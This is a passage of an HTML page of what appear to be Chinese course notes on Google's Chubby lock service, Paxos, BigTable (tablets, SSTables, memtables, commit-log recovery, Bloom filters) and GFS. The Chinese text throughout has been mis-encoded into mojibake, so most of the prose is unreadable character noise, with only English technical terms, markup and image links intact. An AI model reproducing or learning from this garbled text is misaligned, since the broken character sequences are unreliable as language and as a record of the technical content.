<li>æ–°çš„ä¸»æœåŠ¡å™¨å¾ˆå¿«è¢«é‡æ–°é€‰å‡ºï¼Œå½“å®ƒæ¥åˆ°å®¢æˆ·ç«¯çš„ç¬¬ä¸€ä¸ªKeepAliveè¯·æ±‚ï¼ˆ4å·æ¶ˆæ¯ï¼‰æ—¶ä¼šæ‹’ç»ï¼ˆ5å·æ¶ˆæ¯ï¼‰ï¼Œå› ä¸ºè¿™ä¸ªè¯·æ±‚çš„çºªå…ƒå·ï¼ˆEpoch Numberï¼‰é”™è¯¯ã€‚</li>
<li>ä¸åŒä¸»æœåŠ¡å™¨çš„çºªå…ƒå·ä¸ç›¸åŒï¼Œå®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚éƒ½éœ€è¦è¿™ä¸ªå·æ¥ä¿è¯å¤„ç†çš„è¯·æ±‚æ˜¯é’ˆå¯¹å½“å‰çš„ä¸»æœåŠ¡å™¨ã€‚å®¢æˆ·ç«¯åœ¨ä¸»æœåŠ¡å™¨æ‹’ç»ä¹‹åä¼šä½¿ç”¨æ–°çš„çºªå…ƒå·æ¥å‘é€KeepAliveè¯·æ±‚ï¼ˆ6å·æ¶ˆæ¯ï¼‰ã€‚</li>
<li>æ–°çš„ä¸»æœåŠ¡å™¨æ¥å—è¿™ä¸ªè¯·æ±‚å¹¶ç«‹åˆ»åšå‡ºå›åº”ï¼ˆ7å·æ¶ˆæ¯ï¼‰ã€‚å¦‚æœå®¢æˆ·ç«¯æ¥æ”¶åˆ°è¿™ä¸ªå›åº”çš„æ—¶é—´ä»å¤„äºå®½é™æœŸå†…ï¼Œç³»ç»Ÿä¼šæ¢å¤åˆ°å®‰å…¨çŠ¶æ€ï¼Œç§Ÿçº¦æœŸæ›´æ–°ä¸ºC3ã€‚å¦‚æœåœ¨å®½é™æœŸæœªæ¥åˆ°ä¸»æœåŠ¡å™¨çš„ç›¸å…³å›åº”ï¼Œå®¢æˆ·ç«¯ç»ˆæ­¢å½“å‰çš„ä¼šè¯ã€‚</li>
</ol>
<h3 id="ä¸»æœåŠ¡å™¨æ•…éšœ"><a href="#ä¸»æœåŠ¡å™¨æ•…éšœ" class="headerlink" title="ä¸»æœåŠ¡å™¨æ•…éšœ"></a>ä¸»æœåŠ¡å™¨æ•…éšœ</h3><p>åœ¨å®¢æˆ·ç«¯å’Œä¸»æœåŠ¡å™¨ç«¯è¿›è¡Œé€šä¿¡æ—¶å¯èƒ½ä¼šé‡åˆ°ä¸»æœåŠ¡å™¨æ™ºéšœï¼Œå“¦ä¸ï¼Œæ•…éšœï¼Œä¸Šå›¾å°±å‡ºç°äº†è¿™ç§æƒ…å†µã€‚</p>
<p>æ­£å¸¸æƒ…å†µä¸‹æ—§çš„ä¸»æœåŠ¡å™¨å‡ºç°æ•…éšœåç³»ç»Ÿä¼šå¾ˆå¿«åœ°é€‰ä¸¾å‡ºæ–°çš„ä¸»æœåŠ¡å™¨ï¼Œæ–°é€‰ä¸¾çš„ä¸»æœåŠ¡å™¨åœ¨å®Œå…¨è¿è¡Œå‰éœ€è¦ç»å†ä»¥ä¸‹ä¹ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>äº§ç”Ÿä¸€ä¸ªæ–°çš„çºªå…ƒå·ä»¥ä¾¿ä»Šåå®¢æˆ·ç«¯é€šä¿¡æ—¶ä½¿ç”¨ï¼Œè¿™èƒ½ä¿è¯å½“å‰çš„ä¸»æœåŠ¡å™¨ä¸å¿…å¤„ç†é’ˆå¯¹æ—§çš„ä¸»æœåŠ¡å™¨çš„è¯·æ±‚ã€‚</li>
<li>åªå¤„ç†ä¸»æœåŠ¡å™¨ä½ç½®ç›¸å…³çš„ä¿¡æ¯ï¼Œä¸å¤„ç†ä¼šè¯ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
<li>æ„å»ºå¤„ç†ä¼šè¯å’Œé”æ‰€éœ€çš„å†…éƒ¨æ•°æ®ç»“æ„ã€‚</li>
<li>å…è®¸å®¢æˆ·ç«¯å‘é€KeepAliveè¯·æ±‚ï¼Œä¸å¤„ç†å…¶ä»–ä¼šè¯ç›¸å…³çš„ä¿¡æ¯ã€‚</li>
<li>å‘æ¯ä¸ªä¼šè¯å‘é€ä¸€ä¸ªæ•…éšœäº‹ä»¶ï¼Œä¿ƒä½¿æ‰€æœ‰çš„å®¢æˆ·ç«¯æ¸…ç©ºç¼“å­˜ã€‚</li>
<li>ç­‰å¾…ç›´åˆ°æ‰€æœ‰çš„ä¼šè¯éƒ½æ”¶åˆ°æ•…éšœäº‹ä»¶æˆ–ä¼šè¯ç»ˆæ­¢ã€‚</li>
<li>å¼€å§‹å…è®¸æ‰§è¡Œæ‰€æœ‰çš„æ“ä½œã€‚</li>
<li>å¦‚æœå®¢æˆ·ç«¯ä½¿ç”¨äº†æ—§çš„å¥æŸ„åˆ™éœ€è¦ä¸ºå…¶é‡æ–°æ„å»ºæ–°çš„å¥æŸ„ã€‚</li>
<li>ä¸€å®šæ—¶é—´æ®µåï¼ˆ1åˆ†é’Ÿï¼‰ï¼Œåˆ é™¤æ²¡æœ‰è¢«æ‰“å¼€è¿‡çš„ä¸´æ—¶æ–‡ä»¶å¤¹ã€‚</li>
</ol>
<p>å¦‚æœè¿™ä¸€è¿‡ç¨‹åœ¨å®½é™æœŸå†…é¡ºåˆ©å®Œæˆï¼Œæ–°æ—§ä¸»æœåŠ¡å™¨çš„æ›¿æ¢å¯¹äºç”¨æˆ·æ¥è¯´æ˜¯<strong>é€æ˜</strong>çš„ã€‚</p>
<p>ç”¨æˆ·æ„Ÿè§‰åˆ°çš„ä»…ä»…æ˜¯ä¸€ä¸ªå»¶è¿Ÿã€‚</p>
<h2 id="Paxosç®—æ³•-ä»–æ²¡æ€ä¹ˆè®²ï¼Œåº”è¯¥è€ƒä¸åˆ°"><a href="#Paxosç®—æ³•-ä»–æ²¡æ€ä¹ˆè®²ï¼Œåº”è¯¥è€ƒä¸åˆ°" class="headerlink" title="Paxosç®—æ³•(ä»–æ²¡æ€ä¹ˆè®²ï¼Œåº”è¯¥è€ƒä¸åˆ°)"></a>Paxosç®—æ³•(ä»–æ²¡æ€ä¹ˆè®²ï¼Œåº”è¯¥è€ƒä¸åˆ°)</h2><h3 id="Paxosç®—æ³•ç›®çš„"><a href="#Paxosç®—æ³•ç›®çš„" class="headerlink" title="Paxosç®—æ³•ç›®çš„"></a>Paxosç®—æ³•ç›®çš„</h3><p>ä¸€ç§åŸºäºæ¶ˆæ¯ä¼ é€’çš„ä¸€è‡´æ€§ç®—æ³•ï¼Œç”¨äºè§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„ä¸€è‡´æ€§é—®é¢˜ã€‚</p>
<h3 id="Paxosç®—æ³•æ€æƒ³"><a href="#Paxosç®—æ³•æ€æƒ³" class="headerlink" title="Paxosç®—æ³•æ€æƒ³"></a>Paxosç®—æ³•æ€æƒ³</h3><p>èŠ‚ç‚¹è¢«åˆ†æˆäº†ä¸‰ç§ç±»å‹</p>
<ul>
<li>proposers</li>
<li>acceptors</li>
<li>learners</li>
</ul>
<p><strong>å…¶ä¸­ï¼š</strong></p>
<ul>
<li>proposersæå‡ºå†³è®®ï¼ˆvalueï¼Œå®é™…ä¸Šå°±æ˜¯å‘Šè¯‰ç³»ç»Ÿæ¥ä¸‹æ¥è¯¥æ‰§è¡Œå“ªä¸ªæŒ‡ä»¤ï¼‰</li>
<li>acceptorsæ‰¹å‡†å†³è®®</li>
<li>learnersè·å–å¹¶ä½¿ç”¨å·²ç»é€šè¿‡çš„å†³è®®</li>
</ul>
<p>ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥å…¼æœ‰å¤šé‡ç±»å‹</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶å°±å¯ä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚</p>
<ol>
<li>å†³è®®åªæœ‰åœ¨è¢«proposersæå‡ºåæ‰èƒ½æ‰¹å‡†ã€‚</li>
<li>æ¯æ¬¡åªæ‰¹å‡†<strong>ä¸€ä¸ª</strong>å†³è®®ã€‚</li>
<li>åªæœ‰å†³è®®ç¡®å®šè¢«æ‰¹å‡†ålearnersæ‰èƒ½è·å–è¿™ä¸ªå†³è®®ã€‚</li>
</ol>
<p>acceptorså¯¹å†³è®®è¿›è¡Œæ‰¹å‡†ï¼Œé‡‡ç”¨å°‘æ•°æœä»å¤šæ•°åŸåˆ™ï¼Œå³å¤§å¤šæ•°acceptorsæ¥å—çš„å†³è®®å°†æˆä¸ºæœ€ç»ˆçš„æ­£å¼å†³è®®ã€‚</p>
<h1 id="äº‘è®¡ç®—-BigTable"><a href="#äº‘è®¡ç®—-BigTable" class="headerlink" title="äº‘è®¡ç®— - BigTable"></a>äº‘è®¡ç®— - BigTable</h1><h2 id="ä¸ºä»€ä¹ˆéœ€è¦è®¾è®¡BigTableï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆéœ€è¦è®¾è®¡BigTableï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆéœ€è¦è®¾è®¡BigTableï¼Ÿ"></a>ä¸ºä»€ä¹ˆéœ€è¦è®¾è®¡BigTableï¼Ÿ</h2><p>Googleéœ€è¦å­˜å‚¨çš„æ•°æ®ç§ç±»ç¹å¤š</p>
<ul>
<li>ç½‘é¡µï¼Œåœ°å›¾æ•°æ®ï¼Œé‚®ä»¶â€¦â€¦</li>
<li>å¦‚ä½•ä½¿ç”¨ç»Ÿä¸€çš„æ–¹å¼å­˜å‚¨å„ç±»æ•°æ®ï¼Ÿ</li>
</ul>
<p>æµ·é‡çš„æœåŠ¡è¯·æ±‚</p>
<ul>
<li>å¦‚ä½•å¿«é€Ÿåœ°ä»æµ·é‡ä¿¡æ¯ä¸­å¯»æ‰¾éœ€è¦çš„æ•°æ®ï¼Ÿ</li>
</ul>
<h2 id="BigTableæ¦‚è¿°"><a href="#BigTableæ¦‚è¿°" class="headerlink" title="BigTableæ¦‚è¿°"></a>BigTableæ¦‚è¿°</h2><p>åŸºäºGFSå’ŒChubbyçš„åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ</p>
<ul>
<li>å¯¹æ•°æ®è¿›è¡Œ<strong>ç»“æ„åŒ–</strong>å­˜å‚¨å’Œç®¡ç†</li>
<li>ä¸GFSçš„è”ç³»ï¼Œå­˜åˆ°åº•å±‚éƒ½æ˜¯GFS</li>
</ul>
<h2 id="BigTableçš„è®¾è®¡åŠ¨æœº"><a href="#BigTableçš„è®¾è®¡åŠ¨æœº" class="headerlink" title="BigTableçš„è®¾è®¡åŠ¨æœº"></a>BigTableçš„è®¾è®¡åŠ¨æœº</h2><p>æ¥æºäºGoogleçš„éœ€æ±‚</p>
<ul>
<li>æ•°æ®å­˜å‚¨å¯é æ€§</li>
<li>é«˜é€Ÿæ•°æ®æ£€ç´¢ä¸è¯»å–</li>
<li>å­˜å‚¨æµ·é‡çš„è®°å½•ï¼ˆè‹¥å¹²TBï¼‰</li>
<li>å¯ä»¥ä¿å­˜è®°å½•çš„å¤šä¸ªç‰ˆæœ¬</li>
</ul>
<p><strong>BigTableå’Œæ•°æ®åº“çš„Tableå¯å®Œå…¨ä¸ä¸€æ ·:</strong></p>
<ul>
<li>æ•°æ®åº“çš„tableæœ‰å¤–é”®å…³è”ï¼Œæœ‰å®ä½“ä¹‹é—´çš„å…³ç³»ï¼›</li>
<li>BigTableæ²¡æœ‰å…³ç³»è¿™ä¸€è¯´ï¼Œæ˜¯nosqlï¼Œä¸æ”¯æŒå…³ç³»æ“ä½œã€‚ï¼ˆè€Œä¸”äº‘å­˜å‚¨ä¸€èˆ¬éƒ½ä¸æ”¯æŒï¼‰</li>
</ul>
<h2 id="BigTableçš„é€»è¾‘è§†å›¾"><a href="#BigTableçš„é€»è¾‘è§†å›¾" class="headerlink" title="BigTableçš„é€»è¾‘è§†å›¾"></a>BigTableçš„é€»è¾‘è§†å›¾</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451841.png" alt="image-20190421174449346"></p>
<h2 id="BigTableæ•°æ®æ¨¡å‹"><a href="#BigTableæ•°æ®æ¨¡å‹" class="headerlink" title="BigTableæ•°æ®æ¨¡å‹"></a>BigTableæ•°æ®æ¨¡å‹</h2><h3 id="è¡Œ"><a href="#è¡Œ" class="headerlink" title="è¡Œ"></a>è¡Œ</h3><ul>
<li><p>æ¯è¡Œæ•°æ®æœ‰ä¸€ä¸ªå¯æ’åºçš„å…³é”®å­—å’Œä»»æ„åˆ—é¡¹ï¼Œå³key</p>
</li>
<li><p>å­—ç¬¦ä¸²ã€æ•´æ•°ã€äºŒè¿›åˆ¶ä¸²ç”šè‡³å¯ä¸²è¡ŒåŒ–çš„ç»“æ„éƒ½å¯ä»¥ä½œä¸ºè¡Œé”®</p>
</li>
<li><p>è¡¨æŒ‰ç…§è¡Œé”®çš„â€œé€å­—èŠ‚æ’åºâ€é¡ºåºå¯¹è¡Œè¿›è¡Œæœ‰åºåŒ–å¤„ç†</p>
</li>
<li><p>è¡¨å†…æ•°æ®éå¸¸â€˜ç¨€ç–â€™ï¼Œä¸åŒçš„è¡Œçš„åˆ—çš„æ•°å®Œå…¨ç›®å¯ä»¥å¤§ä¸ç›¸åŒ</p>
</li>
<li><p>URLæ˜¯è¾ƒä¸ºå¸¸è§çš„è¡Œé”®ï¼Œå­˜å‚¨æ—¶éœ€è¦å€’æ’</p>
<ul>
<li><p>ç»Ÿä¸€åœ°å€åŸŸçš„ç½‘é¡µè¿ç»­å­˜å‚¨ï¼Œä¾¿äºæŸ¥æ‰¾ã€åˆ†æå’Œå‹ç¼©</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451842.png" alt="image-20190421175209421"></p>
</li>
</ul>
</li>
</ul>
<h3 id="åˆ—"><a href="#åˆ—" class="headerlink" title="åˆ—"></a>åˆ—</h3><ul>
<li>ç‰¹å®šå«ä¹‰çš„æ•°æ®çš„é›†åˆï¼Œå¦‚å›¾ç‰‡ã€é“¾æ¥ç­‰</li>
<li><strong>å¯å°†å¤šä¸ªåˆ—å½’å¹¶ä¸ºä¸€ç»„ï¼Œç§°ä¸ºæ—ï¼ˆfamilyï¼‰</strong></li>
<li>é‡‡ç”¨ æ—:é™å®šè¯ çš„è¯­æ³•è§„åˆ™è¿›è¡Œå®šä¹‰<ul>
<li>fileattr:â€œowning_groupâ€, â€œfileattr:owning_userâ€, etc</li>
</ul>
</li>
<li><strong>åŒä¸€ä¸ªæ—çš„æ•°æ®è¢«å‹ç¼©åœ¨ä¸€èµ·ä¿å­˜ï¼Œä¸€ä¸ªchunkæŒ‡ä»¤å¯ä»¥è¯»åˆ°æ‰€æœ‰æ•°æ®ï¼Œä¸ºäº†ä¼˜åŒ–è€Œè®¾ç½®çš„</strong></li>
<li>æ—æ˜¯å¿…é¡»çš„ï¼Œæ˜¯BigTableä¸­è®¿é—®æ§åˆ¶çš„åŸºæœ¬å•å…ƒã€‚</li>
</ul>
<h3 id="æ—¶é—´æˆ³"><a href="#æ—¶é—´æˆ³" class="headerlink" title="æ—¶é—´æˆ³"></a>æ—¶é—´æˆ³</h3><ul>
<li>ä¿å­˜ä¸åŒæ—¶æœŸçš„æ•°æ®ï¼Œå¦‚â€œç½‘é¡µå¿«ç…§â€</li>
</ul>
<h3 id="A-big-table"><a href="#A-big-table" class="headerlink" title="A big table"></a>A big table</h3><ul>
<li>è¡¨ä¸­çš„åˆ—å¯ä»¥ä¸å—é™åˆ¶åœ°å¢é•¿</li>
<li>è¡¨ä¸­çš„æ•°æ®å‡ ä¹å¯ä»¥æ— é™åœ°å¢åŠ </li>
</ul>
<h3 id="æ— æ•°æ®æ ¡éªŒ"><a href="#æ— æ•°æ®æ ¡éªŒ" class="headerlink" title="æ— æ•°æ®æ ¡éªŒ"></a>æ— æ•°æ®æ ¡éªŒ</h3><ul>
<li>æ¯è¡Œéƒ½å¯å­˜å‚¨ä»»æ„æ•°ç›®çš„åˆ—<ul>
<li><strong>BigTableä¸å¯¹åˆ—çš„æœ€å°‘æ•°ç›®è¿›è¡Œçº¦æŸ</strong></li>
</ul>
</li>
<li>ä»»æ„ç±»å‹çš„æ•°æ®å‡å¯å­˜å‚¨<ul>
<li><strong>BigTableå°†æ‰€æœ‰æ•°æ®å‡çœ‹ä½œä¸ºå­—ç¬¦ä¸²</strong></li>
</ul>
</li>
<li>æ•°æ®çš„æœ‰æ•ˆæ€§æ ¡éªŒç”±æ„å»ºäºå…¶ä¸Šçš„åº”ç”¨ç³»ç»Ÿå®Œæˆ</li>
</ul>
<h3 id="ä¸€è‡´æ€§"><a href="#ä¸€è‡´æ€§" class="headerlink" title="ä¸€è‡´æ€§"></a>ä¸€è‡´æ€§</h3><p>é’ˆå¯¹åŒä¸€è¡Œçš„å¤šä¸ªæ“ä½œå¯ä»¥åˆ†ç»„åˆå¹¶</p>
<ul>
<li><strong>ä¸æ”¯æŒå¯¹å¤šè¡Œè¿›è¡Œä¿®æ”¹çš„æ“ä½œç¬¦</strong></li>
</ul>
<h2 id="ç‰©ç†è§†å›¾"><a href="#ç‰©ç†è§†å›¾" class="headerlink" title="ç‰©ç†è§†å›¾"></a>ç‰©ç†è§†å›¾</h2><ul>
<li>é€»è¾‘ä¸Šçš„â€œè¡¨â€è¢«åˆ’åˆ†ä¸ºè‹¥å¹²å­è¡¨ï¼ˆTabletï¼‰</li>
<li><ul>
<li>æ¯ä¸ªTabletç”±å¤šä¸ªSSTableæ–‡ä»¶ç»„æˆ</li>
<li>SSTableæ–‡ä»¶å­˜å‚¨åœ¨GFSä¹‹ä¸Š</li>
</ul>
</li>
<li>æ¯ä¸ªå­è¡¨å­˜å‚¨äº†tableçš„ä¸€éƒ¨åˆ†è¡Œ</li>
<li><ul>
<li>å…ƒæ•°æ®ï¼šèµ·å§‹è¡Œé”®ã€ç»ˆæ­¢è¡Œé”®</li>
<li>å¦‚æœå­è¡¨ä½“ç§¯è¶…è¿‡äº†é˜ˆå€¼ï¼ˆå¦‚200Mï¼‰ï¼Œåˆ™è¿›è¡Œåˆ†å‰²</li>
</ul>
</li>
</ul>
<h3 id="SSTableåŠå­è¡¨åŸºæœ¬ç»“æ„"><a href="#SSTableåŠå­è¡¨åŸºæœ¬ç»“æ„" class="headerlink" title="SSTableåŠå­è¡¨åŸºæœ¬ç»“æ„"></a>SSTableåŠå­è¡¨åŸºæœ¬ç»“æ„</h3><p>SSTableæ˜¯Googleä¸ºBigtableè®¾è®¡çš„å†…éƒ¨æ•°æ®å­˜å‚¨æ ¼å¼ã€‚æ‰€æœ‰çš„SSTableæ–‡ä»¶éƒ½å­˜å‚¨åœ¨GFSä¸Šï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡é”®æ¥æŸ¥è¯¢ç›¸åº”çš„å€¼ï¼Œæ˜¯SSTableæ ¼å¼çš„åŸºæœ¬ç¤ºæ„ã€‚</p>
<p>SSTableä¸­çš„æ•°æ®è¢«åˆ’åˆ†æˆä¸€ä¸ªä¸ªçš„å—ï¼ˆBlockï¼‰ï¼Œæ¯ä¸ªå—çš„å¤§å°æ˜¯å¯ä»¥è®¾ç½®çš„ï¼Œä¸€èˆ¬æ¥è¯´è®¾ç½®ä¸º64KBã€‚åœ¨SSTableçš„ç»“å°¾æœ‰ä¸€ä¸ªç´¢å¼•ï¼ˆIndexï¼‰ï¼Œè¿™ä¸ªç´¢å¼•ä¿å­˜äº†SSTableä¸­å—çš„ä½ç½®ä¿¡æ¯ï¼Œåœ¨SSTableæ‰“å¼€æ—¶è¿™ä¸ªç´¢å¼•ä¼šè¢«åŠ è½½è¿›å†…å­˜ï¼Œè¿™æ ·ç”¨æˆ·åœ¨æŸ¥æ‰¾æŸä¸ªå—æ—¶é¦–å…ˆåœ¨å†…å­˜ä¸­æŸ¥æ‰¾å—çš„ä½ç½®ä¿¡æ¯ï¼Œç„¶ååœ¨ç¡¬ç›˜ä¸Šç›´æ¥æ‰¾åˆ°è¿™ä¸ªå—ï¼Œè¿™ç§æŸ¥æ‰¾æ–¹æ³•é€Ÿåº¦éå¸¸å¿«ã€‚ç”±äºæ¯ä¸ªSSTableä¸€èˆ¬éƒ½ä¸æ˜¯å¾ˆå¤§ï¼Œç”¨æˆ·è¿˜å¯ä»¥é€‰æ‹©å°†å…¶æ•´ä½“åŠ è½½è¿›å†…å­˜ï¼Œè¿™æ ·æŸ¥æ‰¾èµ·æ¥ä¼šæ›´å¿«ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451843.png" alt="image-20190421205014446"></p>
<h2 id="ä½“ç³»ç»“æ„"><a href="#ä½“ç³»ç»“æ„" class="headerlink" title="ä½“ç³»ç»“æ„"></a>ä½“ç³»ç»“æ„</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451844.png" alt="image-20190421204212811"></p>
<h2 id="ä¸»èŠ‚ç‚¹çš„èŒè´£"><a href="#ä¸»èŠ‚ç‚¹çš„èŒè´£" class="headerlink" title="ä¸»èŠ‚ç‚¹çš„èŒè´£"></a>ä¸»èŠ‚ç‚¹çš„èŒè´£</h2><ul>
<li>ä¸ºæ¯ä¸ªå­è¡¨æœåŠ¡å™¨åˆ†é…å­è¡¨ï¼Œå¯¹å¤–æä¾›æœåŠ¡</li>
<li>ä¸GFSåƒåœ¾å›æ”¶è¿›è¡Œäº¤äº’ï¼Œæ”¶å›åºŸå¼ƒçš„SSTable</li>
<li>æ¢æµ‹å­è¡¨æœåŠ¡å™¨çš„æ•…éšœä¸æ¢å¤</li>
<li>è´Ÿè½½å‡è¡¡</li>
</ul>
<h2 id="å­è¡¨æœåŠ¡å™¨æ•…éšœ"><a href="#å­è¡¨æœåŠ¡å™¨æ•…éšœ" class="headerlink" title="å­è¡¨æœåŠ¡å™¨æ•…éšœ"></a>å­è¡¨æœåŠ¡å™¨æ•…éšœ</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451845.png" alt="image-20190421205256096"></p>
<p>å¦‚å›¾ï¼Œå³è¾¹çš„å­è¡¨æœåŠ¡å™¨å‡ºç°æ•…éšœï¼Œä¸»æœåŠ¡å™¨ä¼šä¸­æ­¢è¿™ä¸ªå­è¡¨æœåŠ¡å™¨å¹¶å°†å…¶ä¸Šçš„å­è¡¨å…¨éƒ¨ç§»è‡³å…¶ä»–å­è¡¨æœåŠ¡å™¨ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451846.png" alt="image-20190421205316167"></p>
<h2 id="æ•°æ®è®¿é—®æ–¹å¼"><a href="#æ•°æ®è®¿é—®æ–¹å¼" class="headerlink" title="æ•°æ®è®¿é—®æ–¹å¼"></a>æ•°æ®è®¿é—®æ–¹å¼</h2><p>å­è¡¨åœ°å€çš„æŸ¥è¯¢æ˜¯ç»å¸¸ç¢°åˆ°çš„æ“ä½œã€‚åœ¨Bigtableç³»ç»Ÿçš„å†…éƒ¨é‡‡ç”¨çš„æ˜¯ä¸€ç§ç±»ä¼¼B+æ ‘çš„ä¸‰å±‚æŸ¥è¯¢ä½“ç³»ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451847.png" alt="image-20190421211027761"></p>
<h2 id="æ•°æ®å†™çš„æµç¨‹"><a href="#æ•°æ®å†™çš„æµç¨‹" class="headerlink" title="æ•°æ®å†™çš„æµç¨‹"></a>æ•°æ®å†™çš„æµç¨‹</h2><p>ä»»ä½•å¯¹å­è¡¨çš„å†™æ“ä½œéƒ½ä¼šè®°å½•åˆ°ä¸€ä¸ªå­˜å‚¨åœ¨GFSä¹‹ä¸Šçš„commit logä¸­</p>
<ul>
<li><strong>æ¯ä¸ªå­è¡¨æœåŠ¡å™¨ä¸Šæ‰€æœ‰å­è¡¨å˜åŒ–å¯¹åº”äºä¸€ä¸ªcommit log</strong></li>
</ul>
<p>æ–°çš„æ•°æ®å­˜å‚¨åˆ°å­è¡¨æœåŠ¡å™¨çš„å†…å­˜ï¼ˆmemtableï¼‰ä¸­</p>
<p>æ¬¡å‹ç¼©</p>
<ul>
<li>æ—§æ•°æ®å­˜å‚¨åœ¨SSTableä¸­ï¼Œè€Œæ–°æ•°æ®å­˜æ”¾åœ¨memtableä¸­</li>
<li>å½“memtableä½“ç§¯è¶…è¿‡ä¸€å®šé˜ˆå€¼ï¼Œå°†å½¢æˆSSTableï¼Œå¹¶å†™å…¥GFS</li>
<li>æ¯ä¸ªtabletå¯¹åº”å¤šä¸ªSSTable</li>
</ul>
<h2 id="å­è¡¨æœåŠ¡å™¨æ•…éšœæ¢å¤"><a href="#å­è¡¨æœåŠ¡å™¨æ•…éšœæ¢å¤" class="headerlink" title="å­è¡¨æœåŠ¡å™¨æ•…éšœæ¢å¤"></a>å­è¡¨æœåŠ¡å™¨æ•…éšœæ¢å¤</h2><p>æ–°çš„æ•…éšœ</p>
<ul>
<li>å­è¡¨æœåŠ¡å™¨å†…å­˜ä¸­çš„memtableä¸¢å¤±</li>
</ul>
<p>æ¢å¤æ–¹æ³• <strong>ç”¨logæ¢å¤</strong></p>
<ul>
<li>æŒ‰ç…§tabletå°†è¯¥æœåŠ¡å™¨å¯¹åº”çš„æ—¥å¿—åˆ†ç‰‡</li>
<li>ä¸ºæ¯ä¸ªå¤±æ•ˆtabletåˆ†é…æ–°çš„å­è¡¨æœåŠ¡å™¨</li>
<li>æ–°å­è¡¨æœåŠ¡å™¨è¯»å–å¯¹åº”çš„åˆ†æ®µcommit logï¼Œå¹¶æŒ‰ç…§æ—¥å¿—ä¿®æ”¹tablet</li>
<li>åˆ é™¤commit logä¸­å·²å®æ–½çš„å†…å®¹</li>
<li>é‡æ–°å¯¹å¤–æä¾›æœåŠ¡</li>
</ul>
<h2 id="æ€§èƒ½ä¼˜åŒ–"><a href="#æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="æ€§èƒ½ä¼˜åŒ–"></a>æ€§èƒ½ä¼˜åŒ–</h2><p>å±€éƒ¨æ€§ç¾¤ç»„(Locality Group)</p>
<ul>
<li>æ ¹æ®éœ€è¦ï¼Œå°†åŸæœ¬ä¸å­˜å‚¨åœ¨ä¸€èµ·çš„æ•°æ®ï¼Œä»¥åˆ—æ—ä¸ºå•ä½å­˜å‚¨è‡³å•ç‹¬çš„å­è¡¨</li>
<li>å¦‚ç”¨æˆ·å¯¹ç½‘ç«™æ’åã€è¯­è¨€ç­‰åˆ†æä¿¡æ¯æ„Ÿå…´è¶£ï¼Œé‚£ä¹ˆå¯ä»¥å°†è¿™äº›åˆ—æ—æ”¾è‡³å•ç‹¬çš„å­è¡¨ï¼Œå‡å°‘æ— ç”¨ä¿¡æ¯è¯»å–ï¼Œæ”¹å–„å­˜å–æ•ˆç‡</li>
</ul>
<p>å¸ƒéš†è¿‡æ»¤å™¨(Bloom Filter)</p>
<ul>
<li>ä»€ä¹ˆæ˜¯å¸ƒéš†è¿‡æ»¤å™¨ï¼Ÿåˆ¤æ–­æŸä¸ªå…ƒç´ æ˜¯å¦éš¶å±äºé›†åˆ</li>
<li>ä¼˜ç‚¹ï¼šè¯¯åˆ¤æ¦‚ç‡ä½ï¼Œå…¶å­˜å‚¨ç©ºé—´ä»…ä¸ºHashè¡¨çš„1&#x2F;8è‡³1&#x2F;4</li>
<li>ç”¨äºåˆ¤æ–­åˆ—é”®æ˜¯å¦ä½äºSSTableä¸­ï¼Œå¿«é€Ÿç¡®å®šæŸä¸ªåˆ—é”®çš„ä½ç½®</li>
</ul>
<h1 id="Googleäº‘è®¡ç®—çš„æŠ€æœ¯æ¶æ„"><a href="#Googleäº‘è®¡ç®—çš„æŠ€æœ¯æ¶æ„" class="headerlink" title="Googleäº‘è®¡ç®—çš„æŠ€æœ¯æ¶æ„"></a>Googleäº‘è®¡ç®—çš„æŠ€æœ¯æ¶æ„</h1><h2 id="Chubbyçš„ä½œç”¨"><a href="#Chubbyçš„ä½œç”¨" class="headerlink" title="Chubbyçš„ä½œç”¨"></a>Chubbyçš„ä½œç”¨</h2><ul>
<li>ä¸ºGFSæä¾›é”æœåŠ¡ï¼Œé€‰æ‹©MasterèŠ‚ç‚¹ï¼›è®°å½•Masterçš„ç›¸å…³æè¿°ä¿¡æ¯</li>
<li>é€šè¿‡ç‹¬å é”è®°å½•Chunk Serverçš„æ´»è·ƒæƒ…å†µ</li>
<li>ä¸ºBigTableæä¾›é”æœåŠ¡ï¼Œè®°å½•å­è¡¨å…ƒä¿¡æ¯ï¼ˆå¦‚å­è¡¨æ–‡ä»¶ä¿¡æ¯ã€å­è¡¨åˆ†é…ä¿¡æ¯ã€å­è¡¨æœåŠ¡å™¨ä¿¡æ¯ï¼‰</li>
<li>ï¼ˆå¯èƒ½ï¼‰è®°å½•MapReduceçš„ä»»åŠ¡ä¿¡æ¯</li>
<li>ä¸ºç¬¬ä¸‰æ–¹æä¾›é”æœåŠ¡ä¸æ–‡ä»¶å­˜å‚¨</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451848.png" alt="image-20190421212358675"></p>
<h2 id="GFSçš„ä½œç”¨"><a href="#GFSçš„ä½œç”¨" class="headerlink" title="GFSçš„ä½œç”¨"></a>GFSçš„ä½œç”¨</h2><ul>
<li>å­˜å‚¨BigTableçš„å­è¡¨æ–‡ä»¶</li>
